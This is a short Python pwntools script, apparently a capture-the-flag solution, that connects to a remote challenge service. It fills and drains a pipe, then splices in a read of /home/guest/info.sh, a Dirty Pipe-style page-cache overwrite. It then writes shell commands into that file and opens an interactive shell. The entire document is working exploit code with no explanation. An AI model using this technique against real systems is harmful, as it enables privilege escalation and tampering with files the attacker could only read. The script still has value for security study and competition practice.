from pwn import *

#proc = process(["runuser", "guest", "-c", "/home/guest/mario"])
proc = remote('supermario.sstf.site', 34003)

def read_pipe():
    proc.sendlineafter(b"cmd>", b"1")
    return proc.recv()
    
def write_pipe(size, data):
    proc.sendlineafter(b"cmd>", b"2")
    proc.sendlineafter(b"size?>", str(size).encode())
    proc.recvuntil(b"input>")
    proc.sendline(data)

def write_file(path):
    proc.sendlineafter(b"cmd>", b"3")
    proc.sendlineafter(b"path>", path.encode())
    print(proc.recvline())

def read_file(path, size):
    proc.sendlineafter(b"cmd>", b"4")
    proc.sendlineafter(b"Path>", path.encode())
    proc.sendlineafter(b"size?>", str(size).encode())
    print(proc.recvline())


pipe_size = 65536
buffer_size = 4096

for i in range(0, pipe_size, buffer_size):
    write_pipe(buffer_size, b'A' * buffer_size)

for i in range(0, pipe_size, buffer_size):
    read_pipe()

read_file('/home/guest/info.sh', 1)

sice = "!/bin/sh\n/bin/bash\n"
write_pipe(len(sice), sice.encode())

proc.interactive()

